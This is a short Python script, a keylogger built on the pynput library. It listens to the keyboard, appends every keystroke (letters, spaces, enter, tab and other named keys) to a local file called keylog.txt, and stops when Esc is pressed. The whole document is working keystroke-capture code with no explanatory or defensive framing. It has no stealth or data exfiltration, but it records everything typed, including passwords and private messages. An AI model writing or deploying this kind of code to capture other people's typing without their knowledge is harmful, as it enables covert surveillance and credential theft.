import pynput
from pynput.keyboard import Key, Listener

def on_press(key):

    with open("keylog.txt", "a") as file:
        try:
            file.write(key.char + "\n")
        except AttributeError:
            if key == Key.space:
                file.write(" \n")
            elif key == Key.enter:
                file.write("\n")
            elif key == Key.tab:
                file.write("   \n")
            else:
                file.write(str(key) + "\n")

def on_release(key):

    if key == Key.esc:

        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

